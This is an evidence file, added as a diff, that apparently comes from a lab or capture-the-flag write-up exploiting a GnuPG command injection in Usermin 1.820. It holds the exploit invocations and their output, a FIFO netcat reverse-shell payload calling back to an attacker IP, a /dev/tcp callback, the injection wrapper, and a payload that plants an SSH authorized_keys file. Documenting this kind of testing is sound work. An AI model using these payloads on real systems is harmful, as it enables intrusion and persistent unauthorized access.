@@ -1,0 +1,106 @@
+================================================================================
+evidence_foothold.txt — Usermin 1.820 GnuPG RCE
+================================================================================
+
+[1] Published EDB 50234, unmodified — fails before the trigger
+--------------------------------------------------------------------------------
+$ python3 exploit.py --host 192.168.161.157 --login cassie --password cassie \
+      --lhost 192.168.45.158 --lport 1337
+
+/home/kali/Desktop/exploit.py:73: SyntaxWarning: invalid escape sequence '\?'
+  last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
+[+] Target https://192.168.161.157:20000
+[+] Login successfully
+[+] Setup GnuPG
+[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.158 1337 >/tmp/f;echo "', 'email': '1337@webmin.com'}
+[+] Setup successful
+[+] Fetching key list
+Traceback (most recent call last):
+  File "/home/kali/Desktop/exploit.py", line 73, in exploit
+    last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
+IndexError: list index out of range
+
+Cause: [-2] assumes the keyring renders at least two edit_key.cgi links. The "successfully"
+check is page boilerplate and does not prove key creation. The key itself was created.
+
+
+[2] Rewrite — verify then trigger
+--------------------------------------------------------------------------------
+$ python3 exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
+      --lhost 192.168.45.158 --lport 1337 \
+      --payload 'id > /home/cassie/exec_test.txt 2>&1;'
+
+[+] Target https://192.168.161.157:20000
+[+] Login successfully
+[*] Keys before: [0, 1, 2, 3, 4, 5, 6]
+[*] Creating key through secret.cgi
+[+] Key creation returned no error
+[+] New key index 7
+[*] Triggering https://192.168.161.157:20000/gnupg/edit_key.cgi?idx=7
+[+] Request returned - command ran in the pipeline
+
+Notes
+- "Keys before" shows the keyring is not empty on this account; creation appends index 7.
+- "[+] Request returned" is the script's own wording. Proof is the file below.
+
+
+[3] Proof of execution — read back over FTP, no shell involved
+--------------------------------------------------------------------------------
+$ lftp -u cassie,cassie 192.168.161.157 -e "get exec_test.txt -o /tmp/exec_test.txt; bye"
+$ cat /tmp/exec_test.txt
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
+
+RCE confirmed as cassie (uid 1000). The adm group is what makes /var/log/auth.log readable
+later.
+
+
+[4] The injection point
+--------------------------------------------------------------------------------
+Usermin 1.820, gnupg-lib.pl:
+
+  open(GPG, "$gpgpath --fingerprint \"$_[0]->{'name'}->[0]\" 2>/dev/null |");
+
+The key display name is interpolated into a shell pipeline. Payload wrapper:
+
+  name = '";<command>echo "'
+
+Resulting command line:
+
+  gpg --fingerprint "";<command>echo "" 2>/dev/null |
+
+A payload that does not end in ';' concatenates with the appended echo and fails with
+"Bad fd number" before executing.
+
+
+[5] Reverse shell — did not arrive
+--------------------------------------------------------------------------------
+$ nc -lvnp 1337
+(listening; no connection)
+$ nc -lvnp 1377
+(listening; no connection)
+
+The FIFO payload (rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f)
+leaves the CGI hanging because `cat /tmp/f` blocks. The HTTP request therefore ends in a
+ConnectionError whether or not the shell connected. That error is not evidence either way.
+Callback on 1377 with a plain `bash -c 'bash -i >& /dev/tcp/...'` also never arrived.
+
+Conclusion: injection works, egress does not. The exploit is used as a file-write primitive.
+
+
+[6] authorized_keys written through the RCE
+--------------------------------------------------------------------------------
+payload: echo <base64 of charlie.pub> | base64 -d > /home/cassie/.ssh/authorized_keys
+
+$ lftp -u cassie,cassie 192.168.161.157 -e "ls .ssh; bye"
+-rw-------    1 cassie    cassie          91 Nov 24 22:50 authorized_keys
+
+$ lftp cassie@192.168.161.157:~/ > cat .ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILOcuCxOF3FuY0pG7yuezyTFZhjbqZO48gCqsIo/L+B2 kali@kali
+91 bytes transferred
+
+Correct key, correct mode, correct owner — and SSH still refused it. See evidence_privesc.txt
+and chapter 05: /etc/ssh/sshd_config contains "DenyUsers cassie".
+
+================================================================================
+End of file.
